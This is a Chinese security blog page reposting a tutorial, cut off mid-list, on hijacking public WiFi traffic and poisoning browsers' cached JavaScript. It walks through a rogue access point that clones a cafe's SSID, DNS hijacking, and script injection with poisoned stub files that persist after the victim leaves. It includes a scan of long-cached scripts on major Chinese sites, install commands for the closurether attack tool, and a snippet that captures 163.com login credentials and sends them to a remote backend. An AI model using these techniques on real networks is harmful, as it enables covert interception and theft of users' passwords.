<!DOCTYPE html>
<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！ - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="EtherDream" /><meta name="description" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！大家都知道公共场所的Wifi安全性很差，但并不清楚究竟有多差。大多以为只要不上QQ、不登陆网站账号就没事了，看看新闻小说什么的应该毫无关系。的确如此，看看新闻网页没有涉及任何敏感的账号信息。即便是数据明文传输，Hacker也只能嗅探到你看了哪些新闻，这些毫无价值的信息。不过如此守株待兔的嗅探，似乎也太被动了。既然我们能主动控制流量，何必用这种弱爆了的方法呢？" />
<meta name="keywords" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！" />



<meta name="baidu-site-verification" content="GSIJv096Bu" />



<meta name="generator" content="Hugo 0.82.0" />


<link rel="canonical" href="https://lcx.cc/post/4426/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！" />
<meta property="og:description" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！大家都知道公共场所的Wifi安全性很差，但并不清楚究竟有多差。大多以为只要不上QQ、不登陆网站账号就没事了，看看新闻小说什么的应该毫无关系。的确如此，看看新闻网页没有涉及任何敏感的账号信息。即便是数据明文传输，Hacker也只能嗅探到你看了哪些新闻，这些毫无价值的信息。不过如此守株待兔的嗅探，似乎也太被动了。既然我们能主动控制流量，何必用这种弱爆了的方法呢？" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lcx.cc/post/4426/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2014-09-03T10:58:56&#43;08:00" />
<meta property="article:modified_time" content="2014-09-03T19:13:29&#43;08:00" />

<meta itemprop="name" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！">
<meta itemprop="description" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！大家都知道公共场所的Wifi安全性很差，但并不清楚究竟有多差。大多以为只要不上QQ、不登陆网站账号就没事了，看看新闻小说什么的应该毫无关系。的确如此，看看新闻网页没有涉及任何敏感的账号信息。即便是数据明文传输，Hacker也只能嗅探到你看了哪些新闻，这些毫无价值的信息。不过如此守株待兔的嗅探，似乎也太被动了。既然我们能主动控制流量，何必用这种弱爆了的方法呢？"><meta itemprop="datePublished" content="2014-09-03T10:58:56&#43;08:00" />
<meta itemprop="dateModified" content="2014-09-03T19:13:29&#43;08:00" />
<meta itemprop="wordCount" content="6688">
<meta itemprop="keywords" content="js,WiFi,脚本,劫持,流量,网站,360,app,CDN,DNS,Html,HTTP,IE,IP,Net,QQ,URL,Web,测试,查询,程序,代码,电脑,端口,服务,服务器,浏览器,路由,密码,热点,入侵,数据,网络,网页,文件,问题,无线,新闻,账号,注入," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！"/>
<meta name="twitter:description" content="WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！大家都知道公共场所的Wifi安全性很差，但并不清楚究竟有多差。大多以为只要不上QQ、不登陆网站账号就没事了，看看新闻小说什么的应该毫无关系。的确如此，看看新闻网页没有涉及任何敏感的账号信息。即便是数据明文传输，Hacker也只能嗅探到你看了哪些新闻，这些毫无价值的信息。不过如此守株待兔的嗅探，似乎也太被动了。既然我们能主动控制流量，何必用这种弱爆了的方法呢？"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Nuclear'Atk</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      Nuclear'Atk
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！</h1>
      
      <div class="post-meta">
        <time datetime="2014-09-03" class="post-time">
          2014-09-03
        </time>
        <div class="post-category">
            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
            <a href="https://lcx.cc/categories/js/"> js </a>
            <a href="https://lcx.cc/categories/wifi/"> WiFi </a>
            <a href="https://lcx.cc/categories/%E8%84%9A%E6%9C%AC/"> 脚本 </a>
            <a href="https://lcx.cc/categories/%E5%8A%AB%E6%8C%81/"> 劫持 </a>
            <a href="https://lcx.cc/categories/%E6%B5%81%E9%87%8F/"> 流量 </a>
            <a href="https://lcx.cc/categories/%E7%BD%91%E7%AB%99/"> 网站 </a>
            
          </div>
        <span class="more-meta"> 约 6688 字 </span>
          <span class="more-meta"> 预计阅读 14 分钟 </span>

        
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content">
    
  </div>
</div>

    
    <div class="post-content">
      
<p style="text-indent:2em;">
	<strong>WiFi流量劫持—— 浏览任意页面即可中毒！</strong> 
</p>
<p style="text-indent:2em;">
	大家都知道公共场所的Wifi安全性很差，但并不清楚究竟有多差。大多以为只要不上QQ、不登陆网站账号就没事了，看看新闻小说什么的应该毫无关系。
</p>
<p style="text-indent:2em;">
	的确如此，看看新闻网页没有涉及任何敏感的账号信息。即便是数据明文传输，Hacker也只能嗅探到你看了哪些新闻，这些毫无价值的信息。
</p>
<p style="text-indent:2em;">
	不过如此守株待兔的嗅探，似乎也太被动了。既然我们能主动控制流量，何必用这种弱爆了的方法呢？
</p>
<p style="text-indent:2em;">
	--------------------------------------------------
</p>
<p style="text-indent:2em;">
	在上一篇文章《<a href="http://www.cnblogs.com/index-html/archive/2013/05/06/wifi_hijack_1.html" target="_blank">把笔记本改造成无线路由器 —— &nbsp;手机抓包牛刀小试</a>》里提到如何实现Wifi的流量拦截，并做出更大范围的攻击。
</p>
<p style="text-indent:2em;">
	今天，我们使用一种古老的技术，打造一个巧妙的时光机原型，让我们的脚本能穿越到未来运行。即便今天只看了几个小说网页，也能在未来几天甚至几星期后，打开其他网站时释放我们的代码。
</p>
<p style="text-indent:2em;">
	让入侵不再受时间与空间的限制，实现超长诅咒！
</p>
<p style="text-indent:2em;">
	<a href="/file/old/4453_1.png" target="_blank"><img title="JS脚本缓存投毒，劫持原理图" alt="JS脚本缓存投毒，劫持原理图" src="/file/old/4453_1.png" width="780" height="642" /></a> 
</p>
<p style="text-indent:2em;">
	原理其实非常简单，相信大家看完图就明白了。
</p>
<p style="text-indent:2em;">
	1.&nbsp;当有人连上我们创建的AP时，他的命运已掌控在我们手中了！
</p>
<p style="text-indent:2em;">
	2~5. &nbsp;他访问任何网站，我们的Web代理就能在其中插入一段脚本代码了。当然这不是一般的广告的代码，而是预加载各大网站所用到的脚本文件。
</p>
<p style="text-indent:2em;">
	6~7. &nbsp;一切都在我们掌控之中，我们并非返回真正的脚本库文件。事实上一次预加载那么多文件，很是浪费带宽~&nbsp;<strong>我们只返回一个很小的“桩文件”，让他在未来打开网页时再加载真正的文件。此外，这个“桩文件”里我们还可以额外加些其他脚本:) 由于这些脚本库通常有着很长的缓存时间，因此只要在用户在清空缓存之前，始终从本地缓存里读取这个文件！</strong> 
</p>
<p style="text-indent:2em;">
	8~12. 即使用户离开了公共场所，但常用的脚本文件都已被感染并缓存。只要未来某一天登陆我们预先感染的网站，脚本将穿越时空被唤醒！
</p>
<p style="text-indent:2em;">
	由此看来，只要实现了第1步，之后的几乎都是顺理成章了！
</p>
<p style="text-indent:2em;">
	不过并非所用的人都是小白，还是有不少警惕性高的用户，不会轻易连接没有密码的公开wifi。事实上很多餐厅咖啡店的wifi都是设置了公开的密码的。
</p>
<p style="text-indent:2em;">
	对于这种情况，我们就需要一个功率更大的AP了，并且将SSID与密码设置的和咖啡店的完全一致 —— <strong>根据wifi的连接策略，同样的热点名将会优先选择信号更好的</strong>。如果密码也一样，他们就能顺利的连上我们的AP。于是我们的热点就像磁金石一样，将新来的用户统统吸过来，于是可以尽情的掌控了~~~
</p>
<p style="text-indent:2em;">
	不过最终的难点却不在此，要找出每个网站缓存最久的脚本资源才是重中之重。
</p>
<p style="text-indent:2em;">
	事实上，光看缓存时间是远远不够的　—— <strong>有不少文件设置了很久的缓存，但是他们却经常的更新</strong>。最常见的就是带时间戳或哈希值的脚本URL，他们几乎三两天换一个，却有很长的缓存时间，这显然是不可取的。因此，我们需要根据资源的<strong>缓存时间</strong>和<strong>上次修改时间</strong>，来衡量其<strong>稳定程度</strong>。
</p>
<p style="text-indent:2em;">
	为了能方便从各大网站寻找稳定度较高的资源，我们使用PhantomJS来实现自动化分析。PhantomJS是没有界面的命令行Webkit浏览器，使用它来模拟网站的访问，能为我们节省大量的系统资源。
</p>
<p style="text-indent:2em;">
	我们监听page.onResourceReceived事件，即可获取所有资源请求的回应数据。之前已提到，缓存时间是必要条件，修改时间是充分条件。修改时间早说明这个资源不经常改变，可以放心用！
</p>
<p style="text-indent:2em;">
	首先我们过滤掉缓存很短的资源，很快就过期的资源是没有利用价值的。然后按上修改时间的先后排序，最终为每个站点选择稳定度最优的几个资源。
</p>
<p style="text-indent:2em;">
	代码实现很简单：
</p>
<p style="text-indent:2em;">
	<a href="https://raw.github.com/EtherDream/closurether/master/tool/cache-sniffer/sniffer.js" target="_blank">https://raw.github.com/EtherDream/closurether/master/tool/cache-sniffer/sniffer.js</a> 
</p>
<p style="text-indent:2em;">
	我们测试几个常用的大网站（url.txt）：
</p>
<pre class="prettyprint">www.hao123.com
www.taobao.com
www.renren.com
www.kaixin001.com

www.baidu.com
www.baidu.com/s?wd=ss
tieba.baidu.com
map.baidu.com

weibo.com
www.sina.com.cn

www.mop.com
www.tianya.cn
bbs.tianya.cn

www.youku.com

user.qzone.qq.com
qzone.qq.com

www.163.com
mail.163.com
www.126.com

www.sohu.com</pre>
<p style="text-indent:2em;">
	根据返回的数据来看（-几天没修改 / +缓存几天），每个站点下都有不少很久没有修改的脚本文件。
</p>
<pre class="prettyprint">E:\NodeJS\closurether\tool\cache-sniffer&gt;phantomjs sniffer.js 
== www.hao123.com ====================
-2 / +360        http://s0.hao123img.com/res/js/track.js?381633
 
== www.taobao.com ====================
-497 / +3650        http://a.tbcdn.cn/apps/med/other/p4p/p4p_show_link.js?rd=20120305.js
-229 / +3650        http://a.tbcdn.cn/apps/matrix-mission/feedback/feedback.js
-178 / +3650        http://a.tbcdn.cn/s/kissy/gallery/??offline/1.0/index-min.js?t=20130701201313
 
== www.renren.com ====================
-631 / +365        http://s.xnimg.cn/a12023/jspro/beacon.js
-491 / +365        http://s.xnimg.cn/n/apps/photo/modules/seed/photoSeed.js?r=1373879537560
-454 / +365        http://s.xnimg.cn/a36267/js/register/register-xn6207-v6.js
 
== www.kaixin001.com ====================
-737 / +365        http://s.kaixin001.com.cn/js/core/ScrollObserver-000179b73.js
-732 / +365        http://s.kaixin001.com.cn/js/core/Geometry-0001de487.js
-715 / +365        http://s.kaixin001.com.cn/js/core/cookie/Cookie-0001f6c85.js
 
== tieba.baidu.com ====================
-40 / +30        http://static.tieba.baidu.com/tb/pms/wpo.pda.js?v=2.8
-20 / +3600        http://img.baidu.com/hunter/tiebamonkey.min.20130625.js
-18 / +30        http://tb1.bdstatic.com/tb/static-common/js/tb_ui_ac13f64f.js
 
== weibo.com ====================
-40 / +15        http://js.t.sinajs.cn/t5/register/js/page/login/index.js?version=201307151712
 
== map.baidu.com ====================
-238 / +3600        http://img.baidu.com/hunter/map.js?st=-15902
-53 / +365        http://webmap1.map.bdimg.com/monitor/pdc_jfjmuk.js
-5 / +365        http://webmap1.map.bdimg.com/initmap_gn34ay.js
 
== www.tianya.cn ====================
-12 / +30        http://static.tianyaui.com/global/ty/TY.js
 
== user.qzone.qq.com ====================
-7 / +7        http://imgcache.qq.com/ptlogin/ver/10034/js/h_login_11.js?max_age=604800&amp;ptui_identifier=000E0133918D62675822E216CC1D89FE3A9C1A8B432218E564A3DD6F0B
 
== www.163.com ====================
-716 / +7        http://l.bst.126.net/rsc/js/jquery-1.6.2.min.js
-297 / +90        http://img2.126.net/ntesrich/auto/adbox/adbox-v1.1.2-120705.js
-83 / +90        http://img2.126.net/ntesrich/auto/indexU/fcbox-index-v1.0.0-130422.js
 
== www.sohu.com ====================
-42 / +90        http://js.sohu.com/pv/pvclick1211071116.js
-42 / +90        http://js.sohu.com/pv/spv1209061800.js
 
== www.mop.com ====================
-969 / +299        http://mopimg.cn/openjs/jquery-1.4.4.min.js
-458 / +299        http://mopimg.cn/dc/tj.js
-396 / +299        http://mopimg.cn/tj/dcq.js
 
== bbs.tianya.cn ====================
-301 / +30        http://static.tianyaui.com/global/ty/stat/stat_20080313.js?_=1373879558250
-38 / +30        http://static.tianyaui.com/global/lite/js/lite-all.js?v=201306250800
-27 / +30        http://static.tianyaui.com/global/lite/js/bbs/bbs.js?v=201306250800
 
DONE!</pre>
<p style="text-indent:2em;">
	很好，有了这些数据，就可实现我们计划了！
</p>
<p style="text-indent:2em;">
	下一篇将介绍使用NodeJS来打造这一计划。
</p>
<p style="text-indent:2em;">
	<span style="font-family:KaiTi_GB2312;">以上内容摘自：</span><a href="http://www.cnblogs.com/index-html/archive/2013/06/14/wifi_hijack_2.html" target="_blank"><span style="font-family:KaiTi_GB2312;">http://www.cnblogs.com/index-html/archive/2013/06/14/wifi_hijack_2.html</span></a> 
</p>
<hr />
<p style="text-indent:2em;">
	<strong>WiFi流量劫持—— JS脚本缓存投毒</strong> 
</p>
<p style="text-indent:2em;">
	在上一篇《<a href="http://www.cnblogs.com/index-html/archive/2013/06/14/wifi_hijack_2.html" target="_blank">WiFi流量劫持—— 浏览任意页面即可中毒</a>》（内容已搬运至上边）构思了一个时光机原型，让我们的脚本通过HTTP缓存机制，在未来的某个时刻被执行，因此我们可以实现超大范围的入侵了。
</p>
<p style="text-indent:2em;">
	基于此原理，我们用NodeJS来实现一个简单的样例。得益于node强大的IO管理，以及各种封装好的网络模块，我们可以很容易实现这个想法：
</p>
<ul>
	<li>
		开启一个特殊的DNS服务：所有域名都解析到我们的电脑上。并把Wifi的DHCP-DNS设置为我们的电脑IP。
	</li>
	<li>
		之后连上Wifi的用户打开任何网站，请求都将被我们的node服务收到。我们根据http头中的host字段来转发到真正服务器上。
	</li>
	<li>
		收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户了！
	</li>
	<li>
		当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。我们将其感染，并设置超长的缓存时间。
	</li>
</ul>
<p style="text-indent:2em;">
	于是大功告成！
</p>
<p style="text-indent:2em;">
	<a href="/file/old/4454_1.png" target="_blank"><img title="攻击流程图" alt="攻击流程图" src="/file/old/4454_1.png" width="780" height="440" /></a> 
</p>
<p style="text-indent:2em;">
	为了方便测试和控制，已把整个流程：DNS、HTTP代理、代码分析和注入都使用NodeJS编写，并整合在一起。下面就来测试一下！
</p>
<p style="text-indent:2em;">
	获取Demo: （<a href="https://github.com/EtherDream/closurether" target="_blank">https://github.com/EtherDream/closurether</a>）
</p>
<pre class="prettyprint"># npm install -g closurether</pre>
<p style="text-indent:2em;">
	运行:
</p>
<pre class="prettyprint"># closurether</pre>
<p style="text-indent:2em;">
	启动成功的话，会输出：
</p>
<pre class="prettyprint">[SYS] local ip: 192.168.1.250
[DNS] running 0.0.0.0:53
[WEB] listening 0.0.0.0:80
[WEB] listening 0.0.0.0:443</pre>
<p style="text-indent:2em;">
	当然，192.168.1.250这是我本地的IP，推荐使用固定的IP地址。
</p>
<p style="text-indent:2em;">
	打开无线路由器-DHCP配置，将主DNS设置为自己的IP，重启路由。到此，你已经控制了整个无线网络的流量了！
</p>
<p style="text-indent:2em;">
	用另一台电脑连上你的wifi：
</p>
<p style="text-indent:2em;">
	<img title="用另一台电脑连上你的wifi" alt="用另一台电脑连上你的wifi" src="/file/old/4455_2.png" width="512" height="100" /> 
</p>
<p style="text-indent:2em;">
	这时会发现，ping任何域名，不出意外的话都会返回你的IP，DNS劫持已发挥作用了！
</p>
<pre class="prettyprint">$ ping www.baidu.com
PING www.baidu.com (192.168.1.250): 56 data bytes
Request timeout for icmp_seq 0

$ ping www.google.com
PING www.google.com (192.168.1.250): 56 data bytes
Request timeout for icmp_seq 0</pre>
<p style="text-indent:2em;">
	打开任意网页，一切正常。我们可以在node控制台看到用户访问的每一个请求。
</p>
<p style="text-indent:2em;">
	<img title="我们可以在node控制台看到用户访问的每一个请求" alt="我们可以在node控制台看到用户访问的每一个请求" src="/file/old/4456_3.png" width="731" height="475" /> 
</p>
<p style="text-indent:2em;">
	当然这时网页上什么效果也没出现。这个Demo毕竟是个间谍程序，怎么可能会有界面呢？
</p>
<p style="text-indent:2em;">
	想看效果的话修改项目里的<strong>asset/inject/extern.js</strong>，往里面加一条：
</p>
<pre class="prettyprint">alert('Hello World');</pre>
<p style="text-indent:2em;">
	这时再刷新页面，效果出现了！
</p>
<p style="text-indent:2em;">
	<img title="效果出现了" alt="效果出现了" src="/file/old/4457_4.png" width="663" height="376" /> 
</p>
<p style="text-indent:2em;">
	打开任意网页的源文件，发现其中都注入了我们的脚本内容。为了隐蔽性，这里将注入的脚本伪装成运营商的url，别人还以为是联通宽带插的广告 ^_^
</p>
<p style="text-indent:2em;">
	具体想伪装成什么地址，可以在config.json里配置。
</p>
<p style="text-indent:2em;">
	<img title="具体想伪装成什么地址，可以在config.json里配置。" alt="具体想伪装成什么地址，可以在config.json里配置。" src="/file/old/4458_5.png" width="752" height="444" /> 
</p>
<p style="text-indent:2em;">
	脚本内容正是asset/inject/extern.js文件：
</p>
<p style="text-indent:2em;">
	<img title="脚本内容正是asset/inject/extern.js文件" alt="脚本内容正是asset/inject/extern.js文件" src="/file/old/4459_6.png" width="752" height="444" /> 
</p>
<p style="text-indent:2em;">
	到此，我们已实现把javascript代码注入到WiFi网络的HTTP流量里了！
</p>
<p style="text-indent:2em;">
	下面测试我们的终极目标：能穿越到未来执行的脚本时光机。
</p>
<p style="text-indent:2em;">
	前面仔细观察的话，不难发现注入的脚本内容里多出一大堆url，这些正是我们需要让用户预加载并缓存的各大网站脚本。具体原理在上一篇里已经详细讲解了。
</p>
<p style="text-indent:2em;">
	如果想入侵更多的网站，往tool/cache-sniffer/url.txt里添加。运行：
</p>
<pre class="prettyprint">$ phantomjs sniffer.js</pre>
<p style="text-indent:2em;">
	程序将自动更新注入脚本的内容。
</p>
<p style="text-indent:2em;">
	要想预加载并缓存一个脚本很容易，只需new Image().src='...'。当然有少数浏览器不支持，不过ie和chrome都是支持的。尽管js文件并不是一个图片，但仍然会缓存。（不过现在已经换成更标准的createElement / appendChild了，没有任何兼容性问题）
</p>
<p style="text-indent:2em;">
	上一篇文章已说明，为了减少一次请求大量脚本文件消耗的带宽，我们并不返回真正的原始脚本文件，而是一个很小的“桩文件”，用来启动我们的入侵代码，以及恢复原始脚本文件。
</p>
<p style="text-indent:2em;">
	因此这个“桩文件”代码量非常少，区区百来字节而已。例如hao123网站下的某个已被感染了的脚本：
</p>
<p style="text-indent:2em;">
	<img title="例如hao123网站下的某个已被感染了的脚本" alt="例如hao123网站下的某个已被感染了的脚本" src="/file/old/4460_7.png" width="752" height="444" /> 
</p>
<p style="text-indent:2em;">
	我们创建两个script元素，来加载外网的入侵代码，以及恢复原始脚本代码，使网页能正常运行。<span style="color:#FF0000;">注意：原始脚本url后面的?1必不可少，否则又会从缓存里加载被感染的当前脚本，进入死循环。</span> 
</p>
<p style="text-indent:2em;">
	<strong>使用document.write的好处在于，它创建的脚本是异步加载顺序执行的。</strong>所以在原始脚本未加载完之前，后面的脚本不会执行，避免了未定义错误的发生。
</p>
<p style="text-indent:2em;">
	入侵代码的url可以在config.json里hacker_url字段配置。为了保证未来被感染的脚本被唤醒时，能正常调出你的入侵代码，所以选择一个可靠的外网来存放。
</p>
<p style="text-indent:2em;">
	本Demo演示如何入侵并截获网易首页的账号，可以参考代码：<a href="http://jslog.sinaapp.com/ad.js" target="_blank">http://jslog.sinaapp.com/ad.js</a>。
</p>
<p style="text-indent:2em;">
	演示中的代码很简单，仅仅捕捉用户在网易首页上输入的账号和密码而已，然后传给后台保存到数据库里。
</p>
<pre class="prettyprint">    var url = location.href;
    if (/\.163\.com/i.test(url)) {
        function onSubmit() {
            post(
                NTES.one('#js_loginframe_username').value,
                NTES.one('input[type=password]').value
            );
        }

        NTES.one('.ntes-loginframe-btn').addEventListener('click', onSubmit);

        NTES.one('input[type=password]').addEventListener('keydown', function(e) {
            if (e.keyCode == 13) {
                onSubmit();
            }
        });
    }</pre>
<p style="text-indent:2em;">
	下面重启电脑，并连上家里的WiFi。（连过KFC的用户回家之后的情况）
</p>
<p style="text-indent:2em;">
	<img title="下面重启电脑，并连上家里的WiFi。（连过KFC的用户回家之后的情况）" alt="下面重启电脑，并连上家里的WiFi。（连过KFC的用户回家之后的情况）" src="/file/old/4461_8.png" width="456" height="99" /> 
</p>
<p style="text-indent:2em;">
	<strong><span style="font-size:18px;">这时用户的流量已完全不在我们的可控之中，看我们的脚本是否仍能从沉睡之中唤醒呢？</span></strong> 
</p>
<p style="text-indent:2em;">
	打开www.163.com，一切正常~
</p>
<p style="text-indent:2em;">
	<a href="/file/old/4462_9.png" target="_blank"><img title="www.163.com" alt="www.163.com" src="/file/old/4462_9.png" width="780" height="417" /></a> 
</p>
<p style="text-indent:2em;">
	输入用户名密码，一切正常~
</p>
<p style="text-indent:2em;">
	<a href="/file/old/4463_10.png" target="_blank"><img title="输入用户名密码，一切正常~" alt="输入用户名密码，一切正常~" src="/file/old/4463_10.png" width="780" height="417" /></a> 
</p>
<p style="text-indent:2em;">
	似乎并没有感觉到任何的异常。回到我们自己的电脑上来看看，后台的笼子里是否有猎物捕捉到。。。
</p>
<p style="text-indent:2em;">
	<a href="/file/old/4464_11.png" target="_blank"><img title="后台的笼子里是否有猎物捕捉到" alt="后台的笼子里是否有猎物捕捉到" src="/file/old/4464_11.png" width="780" height="281" /></a> 
</p>
<p style="text-indent:2em;">
	很好，我们的入侵代码已成功执行，在用户离开了我们的网络之后依旧能够运行！只要登录了我们事先感染过的那些网站，入侵代码都将会被唤醒。
</p>
<p style="text-indent:2em;">
	事实上，只要用户不清空缓存，这段代码终将附着在硬盘缓存里，直到过期。有可能是1个星期，甚至数月的时间。
</p>
<p style="text-indent:2em;">
	所谓一时失足成千古恨莫过于此。一时大意连接了一个wifi热点，不经意间间谍已潜入你的浏览器缓存里。。。
</p>
<p style="text-indent:2em;">
	＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
</p>
<p style="text-indent:2em;">
	使用NodeJS，我们只需数百行代码就实现了这个想法。当然，简单的同时缺点也是不言而喻的。node只提供了传输层的网络接口，我们无法操作底层网络数据。所以只能使用DNS劫持的方法来获得用户的流量。因此也就产生了一个非常纠结的问题：
</p>
<p style="text-indent:2em;">
	怎样才能确定用户查询的域名是HTTP主机呢？
</p>
<p style="text-indent:2em;">
	由于我们把所有的域名都解析到了自己的电脑上，因此包括其他的网络程序数据也转发到了我们这里。然而我们的node只监听了tcp:80端口，对于其他的端口则是完全忽略的。
</p>
<p style="text-indent:2em;">
	即使我们监听了其他端口，我们也无法把收到的数据转发到真实的服务器 —— 我们根本不知道发到哪个地址上！
</p>
<p style="text-indent:2em;">
	<strong>HTTP之所以能实现转发，得益于头部有个host字段</strong>；而非HTTP协议，甚至包括HTTPS，我们只能收到一堆二进制数据，然后就不知道的该交给谁了。
</p>
<p style="text-indent:2em;">
	此问题虽然无法避免，但也有一定程度的解决方案：
</p>
<p style="text-indent:2em;">
	1.) 事先收集各大网站的域名。之后用户查询的域名在列表里的话，直接返回自己的电脑IP；否则转发给外网DNS。
</p>
<p style="text-indent:2em;">
	当记录足够多的话，我们可以拦截住用户大多数的网站流量。
</p>
<p style="text-indent:2em;">
	但要收集大量的网站域名并不容易，而且仍会有不少的遗漏。因此我们使用更简单的方法：
</p>
<p style="text-indent:2em;">
	2.) 仍然将所有的域名解析到自己电脑上，但域名TTL时间很短，几秒后就过期。
</p>
<p style="text-indent:2em;">
	如果在之后的几秒时间里，收到访问这个域名的http请求（host字段是这个域名），那么就认为这个域名是http服务的；
</p>
<p style="text-indent:2em;">
	如果规定时间里没有收到，那么就当做非http服务的域名。当域名ttl过期后，下次再查询这个域名时，就解析到外网真实的服务器IP了。反正不是http协议，收到了也没用。
</p>
<p style="text-indent:2em;">
	3.) 尝试访问前来请求域名的80端口。如果能连接上，就当做是一个Web域名。就返回自己的IP。
</p>
<p style="text-indent:2em;">
	目前使用方法3来识别域名。事实上基于DNS的流量劫持还有更大缺陷：
</p>
<ul>
	<li>
		如果用户手工设置的DNS怎么办？比如8.8.8.8的用户就非常多。
	</li>
	<li>
